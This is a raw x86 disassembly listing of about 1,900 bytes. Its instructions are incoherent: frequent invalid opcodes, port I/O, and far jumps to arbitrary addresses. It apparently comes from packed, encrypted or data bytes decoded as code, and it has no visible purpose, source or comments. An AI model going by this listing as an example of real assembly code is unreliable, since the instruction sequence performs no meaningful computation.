  415d67:	jbe    0x415d42
  415d69:	sub    edx,ebp
  415d6b:	cmp    edi,esp
  415d6d:	add    al,0x9b
  415d6f:	out    0x14,eax
  415d71:	mov    al,ds:0x9cbf3f53
  415d76:	ins    DWORD PTR es:[edi],dx
  415d77:	sub    cl,al
  415d79:	add    eax,0x3900874c
  415d7e:	push   ss
  415d7f:	inc    eax
  415d80:	je     0x415d3c
  415d82:	int    0x58
  415d84:	xor    BYTE PTR [edx+0x3f0832f1],0x8e
  415d8b:	dec    edx
  415d8c:	adc    bl,BYTE PTR [eax]
  415d8e:	and    al,0x17
  415d90:	dec    edi
  415d91:	repnz adc eax,DWORD PTR [edx-0x50]
  415d95:	arpl   WORD PTR [ebx],sp
  415d97:	add    ah,dl
  415d99:	jnp    0x415d26
  415d9b:	adc    BYTE PTR [ebx+0x37],0x90
  415d9f:	std    
  415da0:	mov    cl,0x6e
  415da2:	out    dx,eax
  415da3:	add    bl,BYTE PTR [ebx]
  415da5:	js     0x415dd0
  415da7:	shl    BYTE PTR [ecx+0x5],1
  415daa:	add    al,0x3c
  415dac:	fdivp  st(4),st
  415dae:	push   esi
  415daf:	fstp   TBYTE PTR [edi*4+0x6f29fc45]
  415db6:	inc    ecx
  415db7:	sti    
  415db8:	idiv   BYTE PTR [edi+0x37]
  415dbb:	pop    ebx
  415dbc:	xlat   BYTE PTR ds:[ebx]
  415dbd:	push   esi
  415dbe:	pop    ebp
  415dbf:	outs   dx,DWORD PTR ds:[esi]
  415dc0:	mov    esi,0xb38ba663
  415dc5:	xor    dh,ah
  415dc7:	jne    0x415d96
  415dc9:	pop    ds
  415dca:	leave  
  415dcb:	test   eax,0x336566d5
  415dd0:	enter  0xe9b4,0x1f
  415dd4:	ja     0x415de8
  415dd6:	xor    al,0x1d
  415dd8:	outs   dx,DWORD PTR es:[esi]
  415dda:	repz lahf 
  415ddc:	jbe    0x415d84
  415dde:	aaa    
  415ddf:	cmp    ecx,DWORD PTR [eax-0x1f]
  415de2:	or     eax,0xf6b1b113
  415de7:	in     al,dx
  415de8:	push   eax
  415de9:	stos   BYTE PTR es:[edi],al
  415dea:	pop    DWORD PTR [ebx+ecx*4-0x3ea3344d]
  415df1:	adc    ah,BYTE PTR [eax+edx*4+0x3f3375f8]
  415df8:	cmp    eax,0xe124a588
  415dfd:	not    ecx
  415dff:	push   DWORD PTR [eax]
  415e01:	jg     0x415ddb
  415e03:	xor    edi,esi
  415e05:	or     ecx,ecx
  415e07:	(bad)  
  415e09:	imul   esi,DWORD PTR [esi+0x45],0x63d363cf
  415e10:	xor    al,0x96
  415e12:	std    
  415e13:	stos   BYTE PTR es:[edi],al
  415e14:	aaa    
  415e15:	xor    BYTE PTR [edx],bh
  415e17:	push   cs
  415e18:	std    
  415e19:	mov    eax,0x8147c968
  415e1e:	in     al,dx
  415e1f:	pushf  
  415e20:	sbb    eax,0xea92c118
  415e25:	retf   
  415e26:	das    
  415e27:	repnz mov esi,0x6970e82
  415e2d:	mov    eax,0xa12efa22
  415e32:	data16 or dl,BYTE PTR ds:0x42575d8f
  415e39:	mov    al,ds:0xc76bb76d
  415e3e:	dec    ecx
  415e3f:	lods   al,BYTE PTR ds:[esi]
  415e40:	ja     0x415e3b
  415e42:	xor    DWORD PTR [edx],edi
  415e44:	xlat   BYTE PTR ds:[ebx]
  415e45:	push   eax
  415e46:	cld    
  415e47:	test   BYTE PTR [edi+0x27],0xab
  415e4b:	repnz pusha 
  415e4d:	inc    edx
  415e4e:	add    bh,BYTE PTR [ecx+0x7a74a8c7]
  415e54:	xchg   DWORD PTR [ebx-0x18abca27],ebp
  415e5a:	cdq    
  415e5b:	mov    dh,0x9c
  415e5d:	fld    QWORD PTR [ebx-0x69]
  415e60:	ret    0xf946
  415e63:	mov    cl,0x19
  415e65:	add    DWORD PTR [eax-0x5a9cfca3],0xffffffac
  415e6c:	fstp   DWORD PTR [ebx+edi*4]
  415e6f:	pminsw mm1,QWORD PTR [esi]
  415e72:	push   esp
  415e73:	pusha  
  415e74:	ret    0x16d7
  415e77:	push   0xffffffb6
  415e79:	(bad)  
  415e7a:	cli    
  415e7b:	push   ds
  415e7c:	call   0x82a7:0xb657e1da
  415e83:	clc    
  415e84:	loop   0x415e90
  415e86:	jmp    0x415e5f
  415e88:	(bad)
  415e8c:	mov    edi,0x384dcf0c
  415e91:	and    eax,0x97de3a63
  415e96:	xor    cl,BYTE PTR [eax+0x2b]
  415e99:	mov    ebx,0x2ae6dd44
  415e9e:	(bad)
  415ea1:	adc    ecx,esp
  415ea3:	loopne 0x415e9f
  415ea5:	xlat   BYTE PTR ds:[ebx]
  415ea6:	inc    edi
  415ea7:	adc    BYTE PTR [edi-0x3d2b4505],ah
  415ead:	sbb    ah,al
  415eaf:	xchg   ebx,eax
  415eb0:	mov    dl,0xbc
  415eb2:	bound  edi,QWORD PTR [eax+0x74]
  415eb5:	fdiv   st,st(2)
  415eb7:	mov    ds:0xefa929b,al
  415ebc:	mov    gs,WORD PTR [eax]
  415ebe:	das    
  415ebf:	scas   al,BYTE PTR es:[edi]
  415ec0:	sub    BYTE PTR [ebp+0x2c0b1d60],ah
  415ec6:	(bad)  
  415ec7:	sub    DWORD PTR [ebp+eax*8+0x490c495b],ebx
  415ece:	pop    ecx
  415ecf:	mov    bh,0x36
  415ed1:	pop    ebp
  415ed2:	mov    ebx,0x80daaa4d
  415ed7:	sub    BYTE PTR [eax],bh
  415ed9:	push   0x1b25edab
  415ede:	mov    edx,0x875ae839
  415ee3:	jo     0x415f52
  415ee5:	dec    edi
  415ee6:	push   ss
  415ee7:	sbb    ah,BYTE PTR [edi-0x6c4c282b]
  415eed:	sub    esp,DWORD PTR [eax-0x15]
  415ef0:	loopne 0x415f01
  415ef2:	repnz cmp al,0x2c
  415ef5:	fs push ds
  415ef7:	into   
  415ef8:	fdivr  st,st(4)
  415efa:	out    dx,al
  415efb:	adc    eax,0xe5db39f8
  415f00:	out    0xe7,al
  415f02:	les    eax,FWORD PTR [ebx+ecx*4+0x79]
  415f06:	jns    0x415f5a
  415f08:	add    BYTE PTR [edx-0x79aa867e],ah
  415f0e:	mov    al,0x4
  415f10:	mov    ds,WORD PTR [edx]
  415f12:	pop    edx
  415f13:	std    
  415f14:	loope  0x415f45
  415f16:	sub    ebx,DWORD PTR [edi+eiz*8]
  415f19:	pop    edx
  415f1a:	sbb    eax,0x92c12794
  415f1f:	xlat   BYTE PTR ds:[ebx]
  415f20:	test   al,0xf9
  415f22:	xchg   ecx,eax
  415f23:	lock adc BYTE PTR [edx+ebx*8+0x6646fa05],0x8f
  415f2c:	and    DWORD PTR [edx+0x56],esi
  415f2f:	mov    ecx,0xe858aa67
  415f34:	and    BYTE PTR ds:0x79868036,ch
  415f3a:	jns    0x415ee0
  415f3c:	(bad)  
  415f3e:	in     eax,dx
  415f3f:	and    bl,dl
  415f41:	push   0x34b9cdf8
  415f46:	push   esi
  415f47:	mov    eax,?
  415f49:	jno    0x415ed6
  415f4b:	je     0x415fc3
  415f4d:	cmp    BYTE PTR [edx-0x2a],cl
  415f50:	dec    edi
  415f51:	int    0xac
  415f53:	idiv   DWORD PTR [esi-0x7f]
  415f56:	cs jne 0x415fc9
  415f59:	hlt    
  415f5a:	hlt    
  415f5b:	inc    esi
  415f5c:	shl    DWORD PTR [edx+0x50289629],1
  415f62:	mov    eax,0x717a64fc
  415f67:	(bad)  
  415f68:	loope  0x415f74
  415f6a:	cmc    
  415f6b:	pop    ebx
  415f6c:	push   ss
  415f6d:	add    esi,DWORD PTR [eax]
  415f6f:	dec    edi
  415f70:	js     0x415ef5
  415f72:	jge    0x415f9b
  415f74:	test   DWORD PTR [eax+0x56],ebp
  415f77:	retf   0x8966
  415f7a:	pushf  
  415f7b:	imul   ebp,ecx,0xc3e0920a
  415f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f82:	(bad)  
  415f83:	ja     0x415f8c
  415f85:	xchg   ecx,eax
  415f86:	gs add esi,eax
  415f89:	inc    ebp
  415f8a:	inc    edx
  415f8b:	push   es
  415f8c:	out    dx,eax
  415f8d:	(bad)  
  415f8e:	and    ebp,DWORD PTR [ebx+0x69]
  415f91:	sub    ebp,DWORD PTR [ebx]
  415f93:	pop    edx
  415f94:	jb     0x415f77
  415f96:	jns    0x415fb9
  415f98:	xchg   edx,eax
  415f99:	ins    DWORD PTR es:[edi],dx
  415f9a:	shl    DWORD PTR [edx+0x26d5e46d],1
  415fa0:	mov    edx,0x2d7c2276
  415fa5:	xor    eax,0x837bc762
  415faa:	xchg   BYTE PTR [ebx],cl
  415fac:	dec    eax
  415fad:	test   BYTE PTR [esi-0x7b1396],al
  415fb3:	or     DWORD PTR [eax-0x4e],ebp
  415fb6:	cli    
  415fb7:	and    eax,0xafcdc939
  415fbc:	sbb    ecx,DWORD PTR [ecx+0x76]
  415fbf:	shl    DWORD PTR [ebp+0x2e],cl
  415fc2:	sub    BYTE PTR [ebx],dh
  415fc4:	bound  edi,QWORD PTR [esi+eiz*2-0x1b]
  415fc8:	add    al,0x24
  415fca:	pop    ecx
  415fcb:	jmp    0xc082:0x387162cb
  415fd2:	outs   dx,BYTE PTR ds:[esi]
  415fd3:	mov    edx,0x39e8dd72
  415fd8:	daa    
  415fd9:	adc    eax,edi
  415fdb:	jge    0x41600c
  415fdd:	cmp    DWORD PTR [eax-0x77],ebx
  415fe0:	stos   BYTE PTR es:[edi],al
  415fe1:	mov    al,ds:0x8b4ad684
  415fe6:	pop    ds
  415fe7:	pop    ecx
  415fe8:	cmp    ebx,DWORD PTR [ecx+0x1]
  415feb:	and    dl,BYTE PTR [eax+0x6ee9e36e]
  415ff1:	or     eax,0x49ce6cde
  415ff6:	scas   eax,DWORD PTR es:[edi]
  415ff7:	jne    0x415fda
  415ff9:	jb     0x416065
  415ffb:	dec    esp
  415ffc:	inc    ecx
  415ffd:	jne    0x415f96
  415fff:	mov    al,0xbb
  416001:	inc    ecx
  416002:	out    0xd2,al
  416004:	nop
  416005:	pop    es
  416006:	mov    eax,ebx
  416008:	cs push esi
  41600a:	dec    dx
  41600c:	aaa    
  41600d:	mov    dl,0x1
  41600f:	jmp    0xbe45:0xa7a97944
  416016:	call   0x9d939c2d
  41601b:	outs   dx,BYTE PTR ds:[esi]
  41601c:	std    
  41601d:	aas    
  41601e:	inc    edx
  41601f:	test   eax,0x34b20750
  416024:	inc    eax
  416025:	push   eax
  416026:	or     ch,BYTE PTR [esi-0x50020f4c]
  41602c:	and    al,0xcd
  41602e:	xor    eax,0x4c6f50d5
  416033:	push   es
  416034:	icebp  
  416035:	cwde   
  416036:	ins    DWORD PTR es:[edi],dx
  416037:	loope  0x4160b5
  416039:	dec    ecx
  41603a:	push   esp
  41603b:	dec    edi
  41603c:	add    eax,0xbbba7c3b
  416041:	fdivrp st(2),st
  416043:	les    ecx,FWORD PTR [esi+esi*8+0x6c27ba0]
  41604a:	jecxz  0x416099
  41604c:	mov    ds:0x43ac427c,al
  416051:	mov    ds:0xd212d503,eax
  416056:	popa   
  416057:	xchg   ebp,eax
  416058:	popa   
  416059:	pushf  
  41605a:	pop    es
  41605b:	or     esi,esi
  41605d:	xchg   ecx,eax
  41605e:	cs cwde 
  416060:	xchg   esp,eax
  416062:	mov    ecx,0x2deb4510
  416067:	hlt    
  416068:	jg     0x4160dd
  41606a:	or     esi,DWORD PTR [edi+esi*4+0x39]
  41606e:	mov    ebp,0xa1436533
  416073:	mov    al,ds:0xb85b0efa
  416078:	jnp    0x4160e0
  41607a:	ins    DWORD PTR es:[edi],dx
  41607b:	mov    dl,0x84
  41607d:	dec    esi
  41607e:	xchg   edi,eax
  41607f:	pop    esp
  416080:	dec    ebx
  416081:	shl    BYTE PTR [edi],1
  416083:	(bad)  
  416084:	and    DWORD PTR [esp+edx*1],ebx
  416087:	jl     0x416009
  416089:	or     DWORD PTR [esi-0x356aa82],0x18
  416090:	das    
  416091:	xchg   ebx,eax
  416092:	lds    ebx,FWORD PTR [ecx-0x3e59fef1]
  416098:	sub    BYTE PTR [ecx+0x43257081],ch
  41609e:	daa    
  41609f:	gs dec esp
  4160a1:	xor    bh,bl
  4160a3:	xor    BYTE PTR [ebp+0x539b63c9],bh
  4160a9:	lods   eax,DWORD PTR ds:[esi]
  4160aa:	push   eax
  4160ab:	jnp    0x4160e0
  4160ad:	jecxz  0x4160af
  4160af:	imul   ecx,DWORD PTR cs:[esi],0xffffffcc
  4160b3:	jp     0x41609b
  4160b5:	pop    edx
  4160b6:	dec    esp
  4160b7:	and    DWORD PTR [esp+ebx*8],ecx
  4160ba:	xchg   ecx,eax
  4160bb:	paddw  mm7,QWORD PTR [esi]
  4160be:	out    dx,al
  4160bf:	inc    edi
  4160c0:	(bad)  
  4160c1:	icebp  
  4160c2:	xchg   esp,eax
  4160c3:	test   eax,0x50a9f8b4
  4160c8:	push   edx
  4160c9:	jecxz  0x4160bd
  4160cb:	mov    BYTE PTR [edi-0x1],bl
  4160ce:	sahf   
  4160cf:	inc    edx
  4160d0:	adc    DWORD PTR ds:0xca473184,edx
  4160d6:	fstp   QWORD PTR [edx+0x59dd3216]
  4160dc:	jp     0x4160fb
  4160de:	data16 add dl,BYTE PTR [edi-0x539e94f0]
  4160e5:	add    ah,ch
  4160e7:	push   eax
  4160e8:	cmc    
  4160e9:	ja     0x416082
  4160eb:	and    eax,DWORD PTR [edx+esi*8+0x31]
  4160ef:	into   
  4160f0:	ret    0xd9d6
  4160f3:	cdq    
  4160f4:	clc    
  4160f5:	daa    
  4160f6:	fs (bad) 
  4160f8:	jmp    0x416124
  4160fa:	sub    eax,0x2596bdc6
  4160ff:	mov    gs,esp
  416101:	mov    ds:0x75a04975,eax
  416106:	push   ds
  416107:	jns    0x416146
  416109:	fdivr  st,st(1)
  41610b:	mov    edi,0x32810738
  416110:	fsqrt  
  416112:	or     al,BYTE PTR [edx+0x0]
  416115:	push   cs
  416116:	fisubr WORD PTR [esi-0x14d7c468]
  41611c:	enter  0x5a6a,0xb5
  416120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416121:	xor    eax,0x98a71bcb
  416126:	retf   
  416127:	cmp    al,0x56
  416129:	outs   dx,BYTE PTR fs:[esi]
  41612b:	pop    ss
  41612c:	adc    edx,esp
  41612e:	aam    0xf4
  416130:	(bad)  [eax+0x39fb1bf6]
  416136:	repz sub ecx,DWORD PTR [esi]
  416139:	and    esi,DWORD PTR [ebx+0xa5ae199]
  41613f:	xor    DWORD PTR [ebx],eax
  416141:	or     DWORD PTR [ecx+0x16],esp
  416144:	repz sbb esp,ebx
  416147:	xchg   edx,eax
  416148:	mov    BYTE PTR [ecx],dl
  41614a:	push   ecx
  41614b:	cs adc cl,al
  41614e:	sahf   
  41614f:	gs out 0x4,al
  416152:	and    DWORD PTR [esi-0x59b19dc9],0xdf6bb2b5
  41615c:	fwait
  41615d:	or     DWORD PTR [eax],edx
  41615f:	(bad)  
  416160:	mov    BYTE PTR [ebp-0x3736cdc8],dl
  416166:	mov    DWORD PTR [edx+0x333d473c],ecx
  41616c:	pop    ecx
  41616d:	stc    
  41616e:	or     eax,0xa464e4c2
  416173:	inc    edi
  416174:	jge    0x416110
  416176:	sub    eax,0x5ee06276
  41617b:	(bad)  
  41617c:	cli    
  41617d:	in     al,dx
  41617e:	arpl   WORD PTR [edx-0x5208d123],sp
  416184:	and    eax,edi
  416186:	cmp    DWORD PTR [eax+0x1a],ecx
  416189:	jne    0x41617a
  41618b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41618c:	jmp    0x10306171
  416191:	(bad)  
  416192:	(bad)  
  416193:	(bad)  
  416194:	pop    edx
  416195:	adc    al,0x9f
  416197:	bound  ecx,QWORD PTR gs:[eax-0x6b9129e4]
  41619e:	nop
  41619f:	scas   al,BYTE PTR es:[edi]
  4161a0:	sbb    BYTE PTR [edi],0x5b
  4161a3:	jl     0x41617b
  4161a5:	xor    dh,bh
  4161a7:	xchg   esi,eax
  4161a8:	stc    
  4161a9:	fwait
  4161aa:	enter  0x52ba,0xf9
  4161ae:	mov    DWORD PTR [edx+0x47],esp
  4161b1:	inc    edx
  4161b2:	push   es
  4161b3:	jmp    0x41617d
  4161b5:	jp     0x4161dc
  4161b7:	ja     0x416143
  4161b9:	fld    DWORD PTR [esi]
  4161bb:	call   0xa129:0xc308985c
  4161c2:	in     al,dx
  4161c3:	or     BYTE PTR [ecx+0x6fb85d14],0xa1
  4161ca:	aad    0xfb
  4161cc:	mov    bl,BYTE PTR [edi+0x57]
  4161cf:	in     al,0x50
  4161d1:	loope  0x416206
  4161d3:	iret   
  4161d4:	mov    DWORD PTR [edi],ebp
  4161d6:	push   esp
  4161d7:	adc    al,0x2
  4161d9:	lock and al,0x9
  4161dc:	mov    ebx,ss
  4161de:	push   esp
  4161df:	dec    ecx
  4161e0:	push   ds
  4161e1:	sbb    al,0x68
  4161e3:	push   esi
  4161e4:	stos   BYTE PTR es:[edi],al
  4161e5:	xchg   edx,eax
  4161e6:	dec    ecx
  4161e7:	test   BYTE PTR [ebx],cl
  4161e9:	xchg   esp,eax
  4161ea:	in     al,0xf1
  4161ec:	pushf  
  4161ed:	lods   al,BYTE PTR ds:[esi]
  4161ee:	xor    al,0x8e
  4161f0:	push   edi
  4161f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161f2:	inc    ecx
  4161f3:	cld    
  4161f4:	xchg   edx,eax
  4161f5:	repnz loope 0x4161ac
  4161f8:	lea    esi,[edx+ecx*2]
  4161fb:	xor    ah,BYTE PTR [edx]
  4161fd:	leave  
  4161fe:	int3   
  4161ff:	jae    0x416204
  416201:	cdq    
  416202:	(bad)  
  416203:	mov    eax,ds:0xdfdd6d55
  416208:	dec    ebx
  416209:	push   edx
  41620a:	fisttp DWORD PTR [esi+edx*8-0x49]
  41620e:	cli    
  41620f:	jne    0x416255
  416211:	mov    ah,0x6b
  416213:	jo     0x41623d
  416215:	cmp    al,BYTE PTR ds:[edx+0x1d2b18c2]
  41621c:	(bad)  
  41621d:	mov    ecx,0x2d530d92
  416222:	cmp    eax,DWORD PTR [eax-0x3a55f774]
  416228:	push   esp
  416229:	js     0x416232
  41622b:	sar    DWORD PTR [edi-0x18],cl
  41622e:	(bad)  
  416230:	mov    cl,0x12
  416232:	jle    0x416247
  416234:	leave  
  416235:	pusha  
  416236:	push   cs
  416237:	mov    edi,DWORD PTR [ebx-0x42e9fd1d]
  41623d:	lods   eax,DWORD PTR ds:[esi]
  41623e:	(bad)  
  41623f:	dec    ebx
  416240:	ds cmc 
  416242:	fdivr  DWORD PTR [ebx+0x38da41e5]
  416248:	xor    al,BYTE PTR [ebp-0x6043910a]
  41624e:	in     eax,0x99
  416250:	lea    edx,[edx+0x60]
  416253:	imul   eax,edi,0x568824b8
  416259:	(bad)  
  41625a:	mov    bh,0xa7
  41625c:	(bad)  
  41625d:	cmp    dl,BYTE PTR [esi-0x7d]
  416260:	or     esi,esi
  416262:	dec    esi
  416263:	xchg   esi,esi
  416265:	pop    edi
  416266:	xchg   ebx,eax
  416267:	inc    BYTE PTR [edx+0x72]
  41626a:	mov    edi,?
  41626c:	push   esp
  41626d:	push   ebx
  41626e:	or     ch,BYTE PTR [edi+0x8fe1fae]
  416274:	sbb    edx,DWORD PTR [eax-0x7860d4d9]
  41627a:	aam    0xd6
  41627c:	adc    DWORD PTR [esi-0x50c0d16b],edi
  416282:	icebp  
  416283:	push   0xca768917
  416288:	dec    eax
  416289:	mov    eax,0x9c15bb60
  41628e:	cmc    
  41628f:	inc    ebp
  416290:	mov    al,0xf1
  416292:	inc    ebx
  416293:	ror    DWORD PTR ds:0x3c65a9ed,cl
  416299:	ins    BYTE PTR es:[edi],dx
  41629a:	mov    ch,0xfa
  41629c:	sbb    ch,BYTE PTR [esi+0x18]
  41629f:	push   ebx
  4162a0:	dec    edx
  4162a1:	mov    dh,0xe
  4162a3:	pop    edi
  4162a4:	(bad)  
  4162a5:	std    
  4162a6:	lods   eax,DWORD PTR ds:[esi]
  4162a7:	inc    edx
  4162a8:	fsincos 
  4162aa:	add    esp,ebp
  4162ac:	and    DWORD PTR [ecx+ebx*2],eax
  4162af:	cld    
  4162b0:	(bad)  
  4162b1:	xchg   edi,eax
  4162b2:	xor    ch,BYTE PTR [edx-0x34]
  4162b5:	push   ebp
  4162b6:	cmp    BYTE PTR [eax+0x69dc047],0x25
  4162bd:	fsub   QWORD PTR [esi]
  4162bf:	mov    bl,0xd2
  4162c1:	test   al,0x51
  4162c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162c4:	call   0xdea7e3a3
  4162c9:	adc    DWORD PTR [esi],ebx
  4162cb:	call   0xb7288d3b
  4162d0:	test   eax,0xf407191f
  4162d5:	cmp    edx,DWORD PTR [ebx-0x174aef49]
  4162db:	sbb    edi,edx
  4162dd:	das    
  4162de:	xor    DWORD PTR [ecx+edi*1-0x33e99efc],eax
  4162e5:	mov    ebp,0xa97ff4da
  4162ea:	push   0x7dff0411
  4162ef:	sub    bh,BYTE PTR [esi+0x22d2218e]
  4162f5:	adc    eax,0x4c923e47
  4162fa:	jne    0x41636c
  4162fc:	mov    ebx,0x774cd3ab
  416301:	push   es
  416302:	mov    ah,0xcf
  416304:	shr    DWORD PTR fs:[ebp-0x11],cl
  416308:	out    dx,al
  416309:	ss aas 
  41630b:	push   edi
  41630c:	repnz mov DWORD PTR [edi],esi
  41630f:	mov    ebx,0xb0dd0a2
  416314:	stos   DWORD PTR es:[edi],eax
  416315:	or     al,0x2c
  416317:	das    
  416318:	shl    BYTE PTR [edi-0x71],0x13
  41631c:	clc    
  41631d:	out    dx,al
  41631e:	ja     0x416339
  416320:	xor    al,0x6b
  416322:	scas   al,BYTE PTR es:[edi]
  416323:	arpl   sp,bx
  416325:	mov    DWORD PTR [edx-0x2336549b],ebx
  41632b:	and    BYTE PTR [eax-0x30e24a28],0x40
  416332:	add    dl,BYTE PTR [eax-0x42c3f23]
  416338:	xor    edi,DWORD PTR [edi-0x1d12955d]
  41633e:	push   0x1c
  416340:	dec    edi
  416341:	out    0x5d,eax
  416343:	out    dx,eax
  416344:	fist   WORD PTR [ecx+0xe6b16b0]
  41634a:	xchg   esp,eax
  41634b:	ret    
  41634c:	or     al,0xf3
  41634e:	int    0xc
  416350:	push   es
  416351:	inc    edx
  416352:	(bad)  
  416353:	cmc    
  416354:	add    DWORD PTR ds:0xda2dd621,edx
  41635a:	imul   edx,edi,0xfcd385d9
  416360:	sub    BYTE PTR [eax+0x13],0x6f
  416364:	sub    DWORD PTR [ecx+0x54b965af],esp
  41636a:	rol    DWORD PTR [edi],cl
  41636c:	cli    
  41636d:	mov    cl,0xbf
  41636f:	mov    ebx,0xfdfe8d11
  416374:	lods   al,BYTE PTR ds:[esi]
  416375:	and    dl,bh
  416377:	and    dh,BYTE PTR [edx+0x4c]
  41637a:	in     al,0xa1
  41637c:	ja     0x4163f4
  41637e:	mov    ch,0xdb
  416380:	das    
  416381:	mul    BYTE PTR [edi+0xf10d586]
  416387:	cld    
  416388:	lds    ecx,FWORD PTR [ecx]
  41638a:	loop   0x4163c9
  41638c:	jl     0x4163d6
  41638e:	xor    eax,0x9a4a6258
  416393:	aam    0xed
  416395:	mov    eax,ds:0xf8fe058e
  41639a:	sar    BYTE PTR [edi+0x39],1
  41639d:	in     eax,0x12
  41639f:	inc    ebp
  4163a0:	dec    esp
  4163a1:	imul   ebp,DWORD PTR [ebx+ebp*2+0x5c],0xffffff88
  4163a6:	inc    ecx
  4163a7:	mov    ah,0x49
  4163a9:	push   ebp
  4163aa:	mov    edi,0x1370beef
  4163af:	xchg   ecx,eax
  4163b0:	pop    eax
  4163b1:	call   0x92da:0x7d8bd78b
  4163b8:	fdiv   DWORD PTR [esi]
  4163ba:	(bad)  
  4163bb:	retf   
  4163bc:	xor    BYTE PTR [eax-0x1d],ah
  4163bf:	arpl   WORD PTR ds:0xb3fbb9b0,cx
  4163c5:	jecxz  0x416408
  4163c7:	mov    al,0xbb
  4163c9:	daa    
  4163ca:	(bad)  
  4163cb:	imul   ebx,DWORD PTR [edx-0x4b],0x48
  4163cf:	and    al,0xf0
  4163d1:	repnz lods al,BYTE PTR ds:[esi]
  4163d3:	je     0x4163dc
  4163d5:	mov    edx,eax
  4163d7:	in     eax,dx
  4163d8:	iret   
  4163d9:	pop    esp
  4163da:	and    DWORD PTR [edx+0x23],0xffffffd4
  4163de:	mov    ch,0xca
  4163e0:	or     DWORD PTR [eax-0x51a9f855],0x65bd4017
  4163ea:	icebp  
  4163eb:	je     0x41639d
  4163ed:	mov    dl,0xe5
  4163ef:	dec    esp
  4163f0:	ret    
  4163f1:	mov    ch,0xe1
  4163f3:	add    DWORD PTR [eax],ebp
  4163f5:	loop   0x4163b6
  4163f7:	cdq    
  4163f8:	(bad)  
  4163f9:	pop    ds
  4163fa:	mov    edx,0x1da1b5f0
  4163ff:	cld    
  416400:	es cmp ebx,edi
  416403:	jne    0x41639d
  416405:	lahf   
  416406:	hlt    
  416407:	int    0xc8
  416409:	push   eax
  41640a:	mov    cl,0x94
  41640c:	retf   0x2e38
  41640f:	push   edi
  416410:	jnp    0x41640c
  416412:	push   ebp
  416413:	js     0x41646e
  416415:	and    DWORD PTR [ecx-0x7e55ae6],0x1fd7dc1a
  41641f:	pop    edi
  416420:	arpl   WORD PTR [edx-0x83775f],bp
  416426:	and    ch,BYTE PTR ss:[eax+0xd471e06]
  41642d:	add    eax,0xa674e1d0
  416432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416433:	test   DWORD PTR [ecx],eax
  416435:	jo     0x416435
  416437:	div    BYTE PTR [eax+0x4e]
  41643a:	iret   
  41643b:	mov    eax,0xb7977301
  416440:	rcl    BYTE PTR ds:0x7099047,1
  416446:	xchg   DWORD PTR [esi],edx
  416448:	lods   al,BYTE PTR ds:[esi]
  416449:	dec    edi
  41644a:	out    0xa7,eax
  41644c:	inc    edi
  41644d:	call   0xfbac8f60
  416452:	dec    edi
  416453:	jmp    0x460356b3
  416458:	nop
  416459:	sbb    ah,0xb1
  41645c:	nop
  41645d:	(bad)
  416460:	lods   al,BYTE PTR ds:[esi]
  416461:	inc    ebp
  416462:	xor    eax,0xd37ac86f
  416467:	dec    edx
  416468:	nop
  416469:	jo     0x4164c4
  41646b:	hlt    
  41646c:	nop
  41646d:	sar    DWORD PTR [esi+eiz*1-0x3aaac4d2],cl
  416474:	fstp   DWORD PTR [ecx]
  416476:	ss dec esi
  416478:	(bad)  
  416479:	jmp    0x4164e4
  41647b:	in     al,dx
  41647c:	retf   
  41647d:	jecxz  0x416439
  41647f:	out    0xcf,al
  416481:	dec    eax
  416482:	lock stos BYTE PTR es:[edi],al
  416484:	iret   
  416485:	mov    bl,0x6c
  416487:	(bad)  
  416488:	adc    eax,0x70121177
  41648d:	loope  0x4164ea
  41648f:	fisttp DWORD PTR [edi-0x49]
  416492:	and    al,0xee
  416494:	ins    DWORD PTR es:[edi],dx
  416495:	pop    ebp
  416496:	fimul  WORD PTR [edi]
  416498:	push   edx
  416499:	xor    ecx,eax
  41649b:	fstp   TBYTE PTR [ecx-0x7893e44a]
  4164a1:	pop    ecx
  4164a2:	xchg   esp,eax
  4164a3:	jg     0x41648e
  4164a5:	std    
  4164a6:	repz mov fs,WORD PTR [edx+0x51]
  4164aa:	dec    esi
  4164ab:	cmp    al,0x75
  4164ad:	pop    ebx
  4164ae:	mov    dl,0x66
  4164b0:	fwait
  4164b1:	das    
  4164b2:	cmp    al,0xbf
  4164b4:	mov    dh,bl
  4164b6:	test   BYTE PTR [edx+ebp*1],0x78
  4164ba:	test   eax,0xe512aa5c
  4164bf:	les    ecx,FWORD PTR [ebp-0x5bf9a497]
  4164c5:	test   eax,0x90dd7597
  4164ca:	jg     0x41654b
  4164cc:	xchg   edx,eax
  4164cd:	xor    edx,edx
  4164cf:	jmp    0x5f805b19
  4164d4:	retf   0xfd4d
  4164d7:	or     DWORD PTR [edx+0x4e6fc73f],edx
  4164dd:	mov    ds:0x9f66c54f,al
  4164e2:	or     al,0x83
  4164e4:	and    bh,BYTE PTR [eax-0x628a975f]
  4164ea:	adc    ebx,DWORD PTR [ebx+0x68]
  4164ed:	add    BYTE PTR [ebx-0x78c17745],dl
  4164f3:	xchg   esp,eax
  4164f4:	pop    ds
  4164f5:	xlat   BYTE PTR ds:[ebx]
  4164f6:	aad    0x4b
  4164f8:	inc    esp
  4164f9:	mov    edx,DWORD PTR [edi+0x45]
  4164fc:	jbe    0x41655a
  4164fe:	mov    ecx,0xb52c19a8
  416503:	xchg   edi,eax
  416504:	mov    edi,0xfe4da862
  416509:	jmp    0x583c:0x1f3b9c55
  416510:	jge    0x41652c
  416512:	scas   al,BYTE PTR es:[edi]
  416513:	mov    bl,0x51
  416515:	mov    edx,0x24cf3d14
  41651b:	jno    0x4164d7
  41651d:	jl     0x416555
  41651f:	xchg   DWORD PTR [ebp+ecx*2-0x7db7d27d],eax
  416526:	sahf   
  416527:	add    DWORD PTR [edx-0x5b37d15a],eax
  41652d:	test   al,0x16
  41652f:	mov    al,0x95
  416531:	imul   ebx,DWORD PTR [eax+0x31dbd82f],0xffffffa5
  416538:	add    eax,0xe61da809
  41653d:	mov    esp,0x13cf5150
  416542:	repnz sub ch,BYTE PTR [esp]
  416546:	pop    ss
  416547:	sbb    DWORD PTR [esi-0x23],esi
  41654a:	shr    BYTE PTR [ebp-0x1f69151e],1
  416550:	and    ah,BYTE PTR [edx]
  416552:	push   esp
  416553:	test   al,0xae
  416555:	or     al,0xd9
  416557:	pop    ds
  416558:	sbb    cl,bh
  41655a:	adc    al,0x8
  41655c:	sub    eax,0xee5528a2
